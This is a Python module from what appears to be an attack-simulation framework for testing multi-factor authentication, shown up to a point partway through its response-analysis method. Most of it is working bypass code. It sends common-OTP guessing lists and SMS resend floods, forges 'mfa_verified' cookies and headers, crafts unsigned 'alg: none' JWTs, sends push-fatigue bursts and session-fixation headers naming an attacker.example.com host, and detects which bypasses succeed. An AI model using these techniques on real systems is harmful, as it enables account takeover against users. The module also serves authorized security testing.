"""
MFA Interception & Bypass testing module.

Tests multi-factor authentication implementations for vulnerabilities including:
- OTP brute force and common code guessing
- MFA flow bypass techniques (step skipping, parameter manipulation)
- Session relay and fixation during MFA
- Token and cookie manipulation to forge MFA completion
- Push notification abuse (fatigue attacks)
- Recovery and fallback mechanism bypass

For AUTHORIZED red team engagements only.

MITRE ATT&CK:
  T1111 - Multi-Factor Authentication Interception
  T1539 - Steal Web Session Cookie
  T1550 - Use Alternate Authentication Material
"""

from __future__ import annotations

import json
import uuid
from typing import Any
from urllib.parse import urlencode

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus


# ---------------------------------------------------------------------------
# Payload constants organized by category
# ---------------------------------------------------------------------------

# 1. OTP Brute Force payloads (15)
OTP_BRUTE_FORCE = [
    # Common 4-digit PINs
    "OTP_BRUTE:0000",
    "OTP_BRUTE:1111",
    "OTP_BRUTE:1234",
    "OTP_BRUTE:4321",
    "OTP_BRUTE:9999",
    "OTP_BRUTE:0001",
    "OTP_BRUTE:2580",
    # Common 6-digit codes
    "OTP_BRUTE:000000",
    "OTP_BRUTE:123456",
    "OTP_BRUTE:654321",
    "OTP_BRUTE:111111",
    "OTP_BRUTE:999999",
    "OTP_BRUTE:123123",
    # Null/empty OTP submission
    "OTP_BRUTE:",
    "OTP_BRUTE:null",
]

# 2. MFA Bypass Techniques (20)
MFA_BYPASS_TECHNIQUES = [
    # Skip MFA step entirely — go straight to post-MFA endpoint
    "MFA_SKIP:direct_dashboard",
    "MFA_SKIP:direct_account",
    # Null byte injection in OTP field
    "MFA_NULLBYTE:%00",
    "MFA_NULLBYTE:\\x00",
    "MFA_NULLBYTE:%00000000",
    # Response manipulation indicators
    "MFA_RESPONSE_MANIP:status_to_200",
    "MFA_RESPONSE_MANIP:body_false_to_true",
    "MFA_RESPONSE_MANIP:body_fail_to_success",
    # Remove MFA parameter entirely
    "MFA_PARAM_REMOVE:omit_otp_field",
    "MFA_PARAM_REMOVE:empty_body",
    # Forge MFA-verified state
    "MFA_FORGE:cookie_mfa_verified_true",
    "MFA_FORGE:header_x_mfa_verified_true",
    # Backup code parameter injection
    "MFA_BACKUP:backup_code=00000000",
    "MFA_BACKUP:recovery_code=00000000",
    # Force SMS resend flooding
    "MFA_FLOOD:resend_sms_x10",
    # Race condition — concurrent OTP submissions
    "MFA_RACE:concurrent_otp_000000",
    "MFA_RACE:concurrent_otp_123456",
    # Previous valid OTP reuse
    "MFA_REUSE:replay_previous_otp",
    # OTP submitted in alternative parameter names
    "MFA_ALT_PARAM:verification_code=000000",
    "MFA_ALT_PARAM:mfa_code=000000",
]

# 3. Session Relay Testing (15)
SESSION_RELAY = [
    # Victim session + attacker MFA
    "RELAY:victim_session_attacker_mfa",
    "RELAY:victim_cookie_attacker_otp",
    # Pre-authenticated session token injection
    "RELAY:pre_auth_session_inject",
    "RELAY:pre_auth_token_fixation",
    # OAuth token relay patterns
    "RELAY:oauth_token_relay",
    "RELAY:oauth_code_intercept",
    # Session fixation before MFA
    "RELAY:session_fixation_pre_mfa",
    "RELAY:session_fixation_cookie_set",
    # CSRF token manipulation during MFA flow
    "RELAY:csrf_token_swap",
    "RELAY:csrf_token_remove",
    "RELAY:csrf_token_reuse",
    # WebSocket session hijack during MFA
    "RELAY:websocket_session_hijack",
    "RELAY:websocket_mfa_bypass",
    # Cross-origin relay
    "RELAY:cross_origin_session_leak",
    "RELAY:referrer_session_leak",
]

# 4. Token/Cookie Manipulation (15)
TOKEN_COOKIE_MANIPULATION = [
    # JWT with mfa_verified claim
    "TOKEN:jwt_mfa_verified_true",
    "TOKEN:jwt_mfa_complete_claim",
    "TOKEN:jwt_amr_claim_mfa",
    # Set-Cookie forgery
    "TOKEN:cookie_mfa_complete_true",
    "TOKEN:cookie_mfa_passed_1",
    "TOKEN:cookie_2fa_verified_yes",
    # Header injection
    "TOKEN:header_x_mfa_token_inject",
    "TOKEN:header_x_2fa_status_complete",
    # Bearer token replay
    "TOKEN:bearer_replay_pre_mfa",
    "TOKEN:bearer_replay_expired",
    # Refresh token without MFA
    "TOKEN:refresh_token_skip_mfa",
    "TOKEN:refresh_token_no_2fa",
    # API key bypass — use API key to skip MFA
    "TOKEN:api_key_bypass_mfa",
    "TOKEN:api_key_direct_auth",
    # SSO token without MFA enforcement
    "TOKEN:sso_token_no_mfa",
]

# 5. Push Notification Abuse (10)
PUSH_NOTIFICATION_ABUSE = [
    # Push fatigue — repeated push notifications
    "PUSH:fatigue_burst_5",
    "PUSH:fatigue_burst_10",
    "PUSH:fatigue_burst_20",
    # Push to wrong device
    "PUSH:wrong_device_id",
    "PUSH:null_device_id",
    # Accept push via API
    "PUSH:api_accept_push",
    "PUSH:api_approve_transaction",
    # Duo bypass parameters
    "PUSH:duo_passcode_bypass",
    # WebAuthn bypass attempts
    "PUSH:webauthn_attestation_none",
    # FIDO2 attestation manipulation
    "PUSH:fido2_attestation_self",
]

# 6. Recovery/Fallback Bypass (10)
RECOVERY_FALLBACK_BYPASS = [
    # Password reset bypasses MFA
    "RECOVERY:password_reset_skip_mfa",
    "RECOVERY:password_reset_link_no_mfa",
    # Security question fallback
    "RECOVERY:security_question_fallback",
    "RECOVERY:security_question_bypass",
    # SMS fallback from app-based MFA
    "RECOVERY:sms_fallback_from_totp",
    "RECOVERY:sms_fallback_downgrade",
    # Recovery email without MFA
    "RECOVERY:recovery_email_no_mfa",
    # Account recovery flow skip
    "RECOVERY:account_recovery_skip_mfa",
    # Magic link bypass
    "RECOVERY:magic_link_bypass",
    "RECOVERY:magic_link_no_mfa_enforce",
]

# Common MFA endpoint paths
MFA_ENDPOINTS = [
    "/verify",
    "/mfa/verify",
    "/2fa/verify",
    "/auth/mfa",
    "/login/mfa",
    "/api/auth/mfa/verify",
    "/api/v1/mfa/verify",
    "/account/mfa/verify",
    "/auth/two-factor",
    "/auth/otp/verify",
]

# Post-MFA endpoints used for skip-step testing
POST_MFA_ENDPOINTS = [
    "/dashboard",
    "/account",
    "/api/me",
    "/home",
    "/app",
    "/portal",
    "/admin",
]

# Indicators that MFA was bypassed successfully
MFA_SUCCESS_INDICATORS = [
    "dashboard",
    "welcome",
    "logged in",
    "login successful",
    "mfa_verified",
    "authenticated",
    "session_token",
    "access_token",
    "bearer",
    "profile",
    "account",
    "my account",
    "two-factor.*success",
    "otp.*accepted",
    "verification.*complete",
]

# Indicators that MFA was NOT bypassed
MFA_FAILURE_INDICATORS = [
    "invalid otp",
    "invalid code",
    "verification failed",
    "incorrect code",
    "mfa required",
    "two-factor required",
    "enter your code",
    "enter verification",
    "code expired",
    "too many attempts",
    "account locked",
]


class MFABypassModule(BaseAttackModule):
    """
    MFA Interception & Bypass testing module.

    Tests multi-factor authentication implementations for common weaknesses
    including OTP brute force, MFA step skipping, session relay, token
    manipulation, push notification abuse, and recovery flow bypass.

    Requires AuthorizationLevel.AGGRESSIVE — this module performs active
    authentication testing that may trigger account lockouts or security alerts.
    """

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="mfa_bypass",
            description=(
                "MFA interception and bypass testing — OTP brute force, step skipping, "
                "session relay, token manipulation, push fatigue, recovery bypass"
            ),
            category="auth",
            mitre_technique_ids=["T1111", "T1539", "T1550"],
            mitre_technique_names=[
                "Multi-Factor Authentication Interception",
                "Steal Web Session Cookie",
                "Use Alternate Authentication Material",
            ],
            auth_level_required=AuthorizationLevel.AGGRESSIVE,
            cwe_ids=["CWE-287", "CWE-308", "CWE-307"],
            tags=["auth", "mfa", "2fa", "bypass", "mitm", "relay", "otp", "totp"],
        )

    # ------------------------------------------------------------------
    # Payload generation
    # ------------------------------------------------------------------

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        """
        Return 85+ payloads across all six categories.

        Options:
            categories (list[str]): limit to specific categories, e.g. ["otp", "relay"]
            extra_otps (list[str]): additional OTP values to brute-force
            session_token (str): a known session token to use in relay tests
        """
        selected = options.get("categories", [])
        payloads: list[str] = []

        if not selected or "otp" in selected:
            payloads.extend(OTP_BRUTE_FORCE)
            # Append any user-supplied extra OTPs
            for extra in options.get("extra_otps", []):
                payloads.append(f"OTP_BRUTE:{extra}")

        if not selected or "bypass" in selected:
            payloads.extend(MFA_BYPASS_TECHNIQUES)

        if not selected or "relay" in selected:
            payloads.extend(SESSION_RELAY)

        if not selected or "token" in selected:
            payloads.extend(TOKEN_COOKIE_MANIPULATION)

        if not selected or "push" in selected:
            payloads.extend(PUSH_NOTIFICATION_ABUSE)

        if not selected or "recovery" in selected:
            payloads.extend(RECOVERY_FALLBACK_BYPASS)

        return payloads

    # ------------------------------------------------------------------
    # Request building
    # ------------------------------------------------------------------

    def _build_requests(
        self,
        target: str,
        payloads: list[str],
        options: dict[str, Any],
    ) -> list[AttackRequest]:
        """
        Construct HTTP requests from payloads.

        Options:
            mfa_endpoint (str): override default MFA verification endpoint
            session_cookie (str): a pre-auth session cookie value
            csrf_token (str): CSRF token for the MFA form
        """
        requests: list[AttackRequest] = []
        mfa_endpoint = options.get("mfa_endpoint", "/mfa/verify")
        session_cookie = options.get("session_cookie", "")
        csrf_token = options.get("csrf_token", "")

        for payload in payloads:
            parts = payload.split(":", 1)
            category = parts[0] if len(parts) == 2 else "UNKNOWN"
            value = parts[1] if len(parts) == 2 else payload

            req_id = str(uuid.uuid4())[:8]

            if category == "OTP_BRUTE":
                requests.append(self._build_otp_brute_request(
                    req_id, target, mfa_endpoint, value, session_cookie, csrf_token, payload,
                ))

            elif category == "MFA_SKIP":
                requests.extend(self._build_skip_requests(req_id, target, value, session_cookie, payload))

            elif category == "MFA_NULLBYTE":
                requests.append(self._build_otp_brute_request(
                    req_id, target, mfa_endpoint, value, session_cookie, csrf_token, payload,
                ))

            elif category == "MFA_RESPONSE_MANIP":
                requests.append(self._build_response_manip_request(
                    req_id, target, mfa_endpoint, value, session_cookie, csrf_token, payload,
                ))

            elif category == "MFA_PARAM_REMOVE":
                requests.append(self._build_param_remove_request(
                    req_id, target, mfa_endpoint, value, session_cookie, payload,
                ))

            elif category == "MFA_FORGE":
                requests.append(self._build_forge_request(
                    req_id, target, mfa_endpoint, value, session_cookie, payload,
                ))

            elif category == "MFA_BACKUP":
                requests.append(self._build_backup_code_request(
                    req_id, target, mfa_endpoint, value, session_cookie, csrf_token, payload,
                ))

            elif category == "MFA_FLOOD":
                requests.extend(self._build_flood_requests(req_id, target, session_cookie, payload))

            elif category == "MFA_RACE":
                requests.extend(self._build_race_requests(
                    req_id, target, mfa_endpoint, value, session_cookie, csrf_token, payload,
                ))

            elif category == "MFA_REUSE":
                requests.append(self._build_reuse_request(
                    req_id, target, mfa_endpoint, session_cookie, csrf_token, payload,
                ))

            elif category == "MFA_ALT_PARAM":
                requests.append(self._build_alt_param_request(
                    req_id, target, mfa_endpoint, value, session_cookie, csrf_token, payload,
                ))

            elif category == "RELAY":
                requests.append(self._build_relay_request(
                    req_id, target, mfa_endpoint, value, session_cookie, payload, options,
                ))

            elif category == "TOKEN":
                requests.append(self._build_token_request(
                    req_id, target, value, session_cookie, payload,
                ))

            elif category == "PUSH":
                requests.append(self._build_push_request(
                    req_id, target, mfa_endpoint, value, session_cookie, payload,
                ))

            elif category == "RECOVERY":
                requests.append(self._build_recovery_request(
                    req_id, target, value, session_cookie, payload,
                ))

            else:
                # Fallback: send a generic POST to the MFA endpoint
                requests.append(AttackRequest(
                    request_id=f"mfa-{req_id}",
                    target=target,
                    method="POST",
                    path=mfa_endpoint,
                    headers={
                        "X-BAS-Attack-Type": category,
                        "X-BAS-Payload": payload,
                    },
                    body=json.dumps({"otp": value}),
                    content_type="application/json",
                ))

        return requests

    # --- Individual request builders ------------------------------------------------

    def _build_otp_brute_request(
        self, req_id: str, target: str, endpoint: str, otp_value: str,
        session_cookie: str, csrf_token: str, payload: str,
    ) -> AttackRequest:
        headers: dict[str, str] = {
            "X-BAS-Attack-Type": "OTP_BRUTE",
            "X-BAS-Payload": payload,
        }
        if session_cookie:
            headers["Cookie"] = session_cookie
        body_dict: dict[str, str] = {"otp": otp_value, "code": otp_value}
        if csrf_token:
            body_dict["csrf_token"] = csrf_token
        return AttackRequest(
            request_id=f"mfa-otp-{req_id}",
            target=target,
            method="POST",
            path=endpoint,
            headers=headers,
            body=json.dumps(body_dict),
            content_type="application/json",
            timeout=15.0,
        )

    def _build_skip_requests(
        self, req_id: str, target: str, value: str,
        session_cookie: str, payload: str,
    ) -> list[AttackRequest]:
        """Skip the MFA step — attempt to access post-MFA pages directly."""
        requests: list[AttackRequest] = []
        for post_mfa_path in POST_MFA_ENDPOINTS:
            headers: dict[str, str] = {
                "X-BAS-Attack-Type": "MFA_SKIP",
                "X-BAS-Payload": payload,
            }
            if session_cookie:
                headers["Cookie"] = session_cookie
            requests.append(AttackRequest(
                request_id=f"mfa-skip-{req_id}-{post_mfa_path.replace('/', '_')}",
                target=target,
                method="GET",
                path=post_mfa_path,
                headers=headers,
                follow_redirects=True,
            ))
        return requests

    def _build_response_manip_request(
        self, req_id: str, target: str, endpoint: str, value: str,
        session_cookie: str, csrf_token: str, payload: str,
    ) -> AttackRequest:
        headers: dict[str, str] = {
            "X-BAS-Attack-Type": "MFA_RESPONSE_MANIP",
            "X-BAS-Payload": payload,
        }
        if session_cookie:
            headers["Cookie"] = session_cookie
        body_dict: dict[str, str] = {"otp": "000000"}
        if csrf_token:
            body_dict["csrf_token"] = csrf_token
        return AttackRequest(
            request_id=f"mfa-resp-{req_id}",
            target=target,
            method="POST",
            path=endpoint,
            headers=headers,
            body=json.dumps(body_dict),
            content_type="application/json",
        )

    def _build_param_remove_request(
        self, req_id: str, target: str, endpoint: str, value: str,
        session_cookie: str, payload: str,
    ) -> AttackRequest:
        headers: dict[str, str] = {
            "X-BAS-Attack-Type": "MFA_PARAM_REMOVE",
            "X-BAS-Payload": payload,
        }
        if session_cookie:
            headers["Cookie"] = session_cookie

        if value == "empty_body":
            body = ""
        else:
            # Submit without the OTP field
            body = json.dumps({"action": "verify"})

        return AttackRequest(
            request_id=f"mfa-rm-{req_id}",
            target=target,
            method="POST",
            path=endpoint,
            headers=headers,
            body=body,
            content_type="application/json",
        )

    def _build_forge_request(
        self, req_id: str, target: str, endpoint: str, value: str,
        session_cookie: str, payload: str,
    ) -> AttackRequest:
        headers: dict[str, str] = {
            "X-BAS-Attack-Type": "MFA_FORGE",
            "X-BAS-Payload": payload,
        }
        if "cookie" in value:
            cookie_parts = [session_cookie] if session_cookie else []
            cookie_parts.append("mfa_verified=true")
            cookie_parts.append("2fa_complete=1")
            headers["Cookie"] = "; ".join(cookie_parts)
        if "header" in value:
            headers["X-MFA-Verified"] = "true"
            headers["X-2FA-Status"] = "complete"

        return AttackRequest(
            request_id=f"mfa-forge-{req_id}",
            target=target,
            method="GET",
            path="/dashboard",
            headers=headers,
            follow_redirects=True,
        )

    def _build_backup_code_request(
        self, req_id: str, target: str, endpoint: str, value: str,
        session_cookie: str, csrf_token: str, payload: str,
    ) -> AttackRequest:
        headers: dict[str, str] = {
            "X-BAS-Attack-Type": "MFA_BACKUP",
            "X-BAS-Payload": payload,
        }
        if session_cookie:
            headers["Cookie"] = session_cookie

        # Parse "backup_code=00000000" style value
        param_name, _, param_value = value.partition("=")
        body_dict: dict[str, str] = {param_name: param_value}
        if csrf_token:
            body_dict["csrf_token"] = csrf_token

        return AttackRequest(
            request_id=f"mfa-bk-{req_id}",
            target=target,
            method="POST",
            path=endpoint,
            headers=headers,
            body=json.dumps(body_dict),
            content_type="application/json",
        )

    def _build_flood_requests(
        self, req_id: str, target: str,
        session_cookie: str, payload: str,
    ) -> list[AttackRequest]:
        """Generate multiple SMS resend requests to test flood protection."""
        headers: dict[str, str] = {
            "X-BAS-Attack-Type": "MFA_FLOOD",
            "X-BAS-Payload": payload,
        }
        if session_cookie:
            headers["Cookie"] = session_cookie

        resend_paths = ["/mfa/resend", "/auth/mfa/resend", "/2fa/resend", "/api/auth/mfa/resend"]
        requests: list[AttackRequest] = []
        for path in resend_paths:
            requests.append(AttackRequest(
                request_id=f"mfa-flood-{req_id}-{path.replace('/', '_')}",
                target=target,
                method="POST",
                path=path,
                headers=headers,
                body=json.dumps({"action": "resend"}),
                content_type="application/json",
            ))
        return requests

    def _build_race_requests(
        self, req_id: str, target: str, endpoint: str, value: str,
        session_cookie: str, csrf_token: str, payload: str,
    ) -> list[AttackRequest]:
        """Generate concurrent OTP submission requests for race condition testing."""
        otp_code = value.split("_")[-1] if "_" in value else "000000"
        headers: dict[str, str] = {
            "X-BAS-Attack-Type": "MFA_RACE",
            "X-BAS-Payload": payload,
        }
        if session_cookie:
            headers["Cookie"] = session_cookie

        body_dict: dict[str, str] = {"otp": otp_code}
        if csrf_token:
            body_dict["csrf_token"] = csrf_token
        body = json.dumps(body_dict)

        # Generate 3 identical requests for race condition
        return [
            AttackRequest(
                request_id=f"mfa-race-{req_id}-{i}",
                target=target,
                method="POST",
                path=endpoint,
                headers=headers,
                body=body,
                content_type="application/json",
                timeout=10.0,
            )
            for i in range(3)
        ]

    def _build_reuse_request(
        self, req_id: str, target: str, endpoint: str,
        session_cookie: str, csrf_token: str, payload: str,
    ) -> AttackRequest:
        headers: dict[str, str] = {
            "X-BAS-Attack-Type": "MFA_REUSE",
            "X-BAS-Payload": payload,
        }
        if session_cookie:
            headers["Cookie"] = session_cookie
        body_dict: dict[str, str] = {"otp": "000000"}
        if csrf_token:
            body_dict["csrf_token"] = csrf_token
        return AttackRequest(
            request_id=f"mfa-reuse-{req_id}",
            target=target,
            method="POST",
            path=endpoint,
            headers=headers,
            body=json.dumps(body_dict),
            content_type="application/json",
        )

    def _build_alt_param_request(
        self, req_id: str, target: str, endpoint: str, value: str,
        session_cookie: str, csrf_token: str, payload: str,
    ) -> AttackRequest:
        headers: dict[str, str] = {
            "X-BAS-Attack-Type": "MFA_ALT_PARAM",
            "X-BAS-Payload": payload,
        }
        if session_cookie:
            headers["Cookie"] = session_cookie

        # Parse "verification_code=000000" style value
        param_name, _, param_value = value.partition("=")
        body_dict: dict[str, str] = {param_name: param_value}
        if csrf_token:
            body_dict["csrf_token"] = csrf_token

        return AttackRequest(
            request_id=f"mfa-alt-{req_id}",
            target=target,
            method="POST",
            path=endpoint,
            headers=headers,
            body=json.dumps(body_dict),
            content_type="application/json",
        )

    def _build_relay_request(
        self, req_id: str, target: str, endpoint: str, value: str,
        session_cookie: str, payload: str, options: dict[str, Any],
    ) -> AttackRequest:
        headers: dict[str, str] = {
            "X-BAS-Attack-Type": "RELAY",
            "X-BAS-Payload": payload,
        }

        attacker_session = options.get("attacker_session", "attacker_session_placeholder")
        victim_session = session_cookie or "victim_session_placeholder"

        if "victim_session_attacker" in value:
            headers["Cookie"] = victim_session
            headers["X-MFA-Session"] = attacker_session
        elif "victim_cookie_attacker" in value:
            headers["Cookie"] = victim_session
            body = json.dumps({"otp": "123456", "session": attacker_session})
        elif "pre_auth" in value:
            headers["Cookie"] = f"SESSIONID=fixated_session_{req_id}"
        elif "oauth" in value:
            headers["Authorization"] = f"Bearer relayed_oauth_token_{req_id}"
        elif "session_fixation" in value:
            headers["Cookie"] = f"PHPSESSID=fixed_{req_id}; JSESSIONID=fixed_{req_id}"
        elif "csrf" in value:
            headers["X-CSRF-Token"] = f"manipulated_csrf_{req_id}"
        elif "websocket" in value:
            headers["Upgrade"] = "websocket"
            headers["Connection"] = "Upgrade"
            headers["Sec-WebSocket-Key"] = f"relay_{req_id}"
        elif "cross_origin" in value:
            headers["Origin"] = "https://attacker.example.com"
            headers["Referer"] = "https://attacker.example.com/relay"
        elif "referrer" in value:
            headers["Referer"] = f"https://attacker.example.com/steal?session={req_id}"

        body = getattr(self, "_relay_body", None)
        return AttackRequest(
            request_id=f"mfa-relay-{req_id}",
            target=target,
            method="POST",
            path=endpoint,
            headers=headers,
            body=json.dumps({"otp": "000000", "relay_type": value}),
            content_type="application/json",
        )

    def _build_token_request(
        self, req_id: str, target: str, value: str,
        session_cookie: str, payload: str,
    ) -> AttackRequest:
        headers: dict[str, str] = {
            "X-BAS-Attack-Type": "TOKEN",
            "X-BAS-Payload": payload,
        }

        if "jwt_mfa_verified" in value:
            # Craft a JWT-like token with mfa_verified claim
            import base64
            jwt_header = base64.urlsafe_b64encode(
                json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).rstrip(b"=").decode()
            jwt_payload = base64.urlsafe_b64encode(
                json.dumps({"sub": "user", "mfa_verified": True, "role": "user"}).encode()
            ).rstrip(b"=").decode()
            headers["Authorization"] = f"Bearer {jwt_header}.{jwt_payload}."
        elif "jwt_mfa_complete" in value:
            import base64
            jwt_header = base64.urlsafe_b64encode(
                json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).rstrip(b"=").decode()
            jwt_payload = base64.urlsafe_b64encode(
                json.dumps({"sub": "user", "mfa_complete": True}).encode()
            ).rstrip(b"=").decode()
            headers["Authorization"] = f"Bearer {jwt_header}.{jwt_payload}."
        elif "jwt_amr" in value:
            import base64
            jwt_header = base64.urlsafe_b64encode(
                json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).rstrip(b"=").decode()
            jwt_payload = base64.urlsafe_b64encode(
                json.dumps({"sub": "user", "amr": ["pwd", "mfa"]}).encode()
            ).rstrip(b"=").decode()
            headers["Authorization"] = f"Bearer {jwt_header}.{jwt_payload}."
        elif "cookie_mfa_complete" in value:
            parts = [session_cookie] if session_cookie else []
            parts.append("mfa_complete=true")
            headers["Cookie"] = "; ".join(parts)
        elif "cookie_mfa_passed" in value:
            parts = [session_cookie] if session_cookie else []
            parts.append("mfa_passed=1")
            headers["Cookie"] = "; ".join(parts)
        elif "cookie_2fa_verified" in value:
            parts = [session_cookie] if session_cookie else []
            parts.append("2fa_verified=yes")
            headers["Cookie"] = "; ".join(parts)
        elif "header_x_mfa_token" in value:
            headers["X-MFA-Token"] = f"forged_mfa_token_{req_id}"
        elif "header_x_2fa_status" in value:
            headers["X-2FA-Status"] = "complete"
        elif "bearer_replay" in value:
            headers["Authorization"] = f"Bearer pre_mfa_token_{req_id}"
        elif "refresh_token" in value:
            headers["Cookie"] = f"refresh_token=refresh_{req_id}"
        elif "api_key" in value:
            headers["X-API-Key"] = f"apikey_{req_id}"
            headers["Authorization"] = f"ApiKey apikey_{req_id}"
        elif "sso_token" in value:
            headers["Authorization"] = f"Bearer sso_no_mfa_{req_id}"
            headers["X-SSO-Token"] = f"sso_{req_id}"

        return AttackRequest(
            request_id=f"mfa-token-{req_id}",
            target=target,
            method="GET",
            path="/dashboard",
            headers=headers,
            follow_redirects=True,
        )

    def _build_push_request(
        self, req_id: str, target: str, endpoint: str, value: str,
        session_cookie: str, payload: str,
    ) -> AttackRequest:
        headers: dict[str, str] = {
            "X-BAS-Attack-Type": "PUSH",
            "X-BAS-Payload": payload,
        }
        if session_cookie:
            headers["Cookie"] = session_cookie

        if "fatigue" in value:
            count = 5
            for suffix in ["5", "10", "20"]:
                if value.endswith(suffix):
                    count = int(suffix)
                    break
            body = json.dumps({"action": "send_push", "count": count, "type": "fatigue_test"})
            path = "/mfa/push/send"
        elif "wrong_device" in value or "null_device" in value:
            device_id = "null" if "null" in value else "wrong_device_id_000"
            body = json.dumps({"action": "send_push", "device_id": device_id})
            path = "/mfa/push/send"
        elif "api_accept" in value or "api_approve" in value:
            body = json.dumps({"action": "approve", "transaction_id": f"txn_{req_id}"})
            path = "/mfa/push/approve"
        elif "duo" in value:
            body = json.dumps({"factor": "passcode", "passcode": "bypass", "device": "auto"})
            path = "/mfa/duo/verify"
        elif "webauthn" in value:
            body = json.dumps({
                "type": "public-key",
                "response": {"attestationObject": "", "clientDataJSON": ""},
                "attestation": "none",
            })
            path = "/mfa/webauthn/verify"
        elif "fido2" in value:
            body = json.dumps({
                "type": "public-key",
                "response": {"attestationObject": "", "clientDataJSON": ""},
                "attestation": "self",
            })
            path = "/mfa/fido2/verify"
        else:
            body = json.dumps({"action": value})
            path = endpoint

        return AttackRequest(
            request_id=f"mfa-push-{req_id}",
            target=target,
            method="POST",
            path=path,
            headers=headers,
            body=body,
            content_type="application/json",
        )

    def _build_recovery_request(
        self, req_id: str, target: str, value: str,
        session_cookie: str, payload: str,
    ) -> AttackRequest:
        headers: dict[str, str] = {
            "X-BAS-Attack-Type": "RECOVERY",
            "X-BAS-Payload": payload,
        }
        if session_cookie:
            headers["Cookie"] = session_cookie

        if "password_reset" in value:
            body = json.dumps({"email": "test@example.com", "action": "reset_password"})
            path = "/auth/password-reset"
        elif "security_question" in value:
            body = json.dumps({
                "answer": "test_answer",
                "question_id": "1",
                "action": "verify_security_question",
            })
            path = "/auth/security-question"
        elif "sms_fallback" in value:
            body = json.dumps({"action": "fallback_to_sms", "method": "sms"})
            path = "/mfa/fallback"
        elif "recovery_email" in value:
            body = json.dumps({"email": "test@example.com", "action": "send_recovery"})
            path = "/auth/recovery"
        elif "account_recovery" in value:
            body = json.dumps({"action": "start_recovery", "skip_mfa": True})
            path = "/auth/account-recovery"
        elif "magic_link" in value:
            body = json.dumps({"email": "test@example.com", "action": "send_magic_link"})
            path = "/auth/magic-link"
        else:
            body = json.dumps({"action": value})
            path = "/auth/recovery"

        return AttackRequest(
            request_id=f"mfa-recovery-{req_id}",
            target=target,
            method="POST",
            path=path,
            headers=headers,
            body=body,
            content_type="application/json",
        )

    # ------------------------------------------------------------------
    # Response analysis
    # ------------------------------------------------------------------

    def _analyze_response(
        self,
        request: AttackRequest,
        response: AttackResponse,
        payload: str,
    ) -> ModuleResult:
        """
        Determine whether a response indicates successful MFA bypass.

        Checks:
        - HTTP status indicating success (200, 201, 302 to dashboard)
        - Success indicators in body (session tokens, dashboard content)
        - Absence of MFA-required indicators
        - Set-Cookie headers containing session/auth tokens
        """
        attack_type = request.headers.get("X-BAS-Attack-Type", "UNKNOWN")
        body_lower = response.body_text.lower()

        # Handle timeout / error
        if response.error == "timeout":
            return ModuleResult(
                module_name="mfa_bypass",
                target=request.target,
                status=VulnStatus.TIMEOUT,
                payload_used=payload,
                response_code=response.status_code,
                elapsed_ms=response.elapsed_ms,
                detail={"attack_type": attack_type},
            )

        if response.error:
            return ModuleResult(
                module_name="mfa_bypass",
                target=request.target,
                status=VulnStatus.ERROR,
                payload_used=payload,
                response_code=response.status_code,
                elapsed_ms=response.elapsed_ms,
                detail={"attack_type": attack_type, "error": response.error},
            )

        # Check for MFA failure indicators first — if present, MFA held
        has_failure_indicator = any(ind in body_lower for ind in MFA_FAILURE_INDICATORS)

        # Check for MFA success / bypass indicators
        has_success_indicator = any(ind in body_lower for ind in MFA_SUCCESS_INDICATORS)

        # Check for session tokens in Set-Cookie header
        set_cookie = response.headers.get("set-cookie", "").lower()
        has_new_session = any(
            tok in set_cookie
            for tok in ["session", "token", "auth", "jwt", "access_token"]
        )

        # Check for redirect to post-MFA page
        location = response.headers.get("location", "").lower()
        redirects_to_app = any(
            ep.lstrip("/") in location
            for ep in POST_MFA_ENDPOINTS
        ) if location else False

        # --- Determine vulnerability status ---

        # Severity mapping per attack type
        severity_map: dict[str, str] = {
            "OTP_BRUTE": "high",
            "MFA_SKIP": "critical",
            "MFA_NULLBYTE": "critical",
            "MFA_RESPONSE_MANIP": "high",
            "MFA_PARAM_REMOVE": "critical",
            "MFA_FORGE": "critical",
            "MFA_BACKUP": "high",
            "MFA_FLOOD": "medium",
            "MFA_RACE": "high",
            "MFA_REUSE": "high",
            "MFA_ALT_PARAM": "high",
            "RELAY": "critical",
            "TOKEN": "critical",
            "PUSH": "high",
            "RECOVERY": "high",
        }

        mitre_map: dict[str, str] = {
            "OTP_BRUTE": "T1111",
            "MFA_SKIP": "T1550",
            "MFA_NULLBYTE": "T1111",
            "MFA_RESPONSE_MANIP": "T1111",
            "MFA_PARAM_REMOVE": "T1111",
            "MFA_FORGE": "T1539",
            "MFA_BACKUP": "T1111",
            "MFA_FLOOD": "T1111",
            "MFA_RACE": "T1111",
            "MFA_REUSE": "T1111",
            "MFA_ALT_PARAM": "T1111",
            "RELAY": "T1539",
            "TOKEN": "T1550",
            "PUSH": "T1111",
            "RECOVERY": "T1550",
        }

        # Strong bypass: success status + success indicator + no failure indicator
        if response.status_code in (200, 201, 204) and has_success_indicator and not has_failure_indicator:
            return ModuleResult(
                module_name="mfa_bypass",
                target=request.target,
                status=VulnStatus.VULNERABLE,
                payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=(
                    f"MFA bypass via {attack_type}: server returned {response.status_code} "
                    f"with authenticated content indicators"
                ),
                severity=severity_map.get(attack_type, "high"),
                mitre_technique_id=mitre_map.get(attack_type, "T1111"),
                detail={
                    "attack_type": attack_type,
                    "has_session_cookie": has_new_session,
                    "success_indicators_found": True,
                },
            )

        # Redirect to post-MFA page
        if response.status_code in (301, 302, 303, 307, 308) and redirects_to_app:
            return ModuleResult(
                module_name="mfa_bypass",
                target=request.target,
                status=VulnStatus.VULNERABLE,
                payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=(
                    f"MFA bypass via {attack_type}: redirected to {location} "
                    f"(post-MFA endpoint) without valid MFA"
                ),
                severity=severity_map.get(attack_type, "high"),
                mitre_technique_id=mitre_map.get(attack_type, "T1111"),
                detail={
                    "attack_type": attack_type,
                    "redirect_location": location,
                    "has_session_cookie": has_new_session,
                },
            )

        # Session token issued without confirmed MFA
        if has_new_session and not has_failure_indicator and response.status_code in (200, 201):
            return ModuleResult(
                module_name="mfa_bypass",
                target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE,
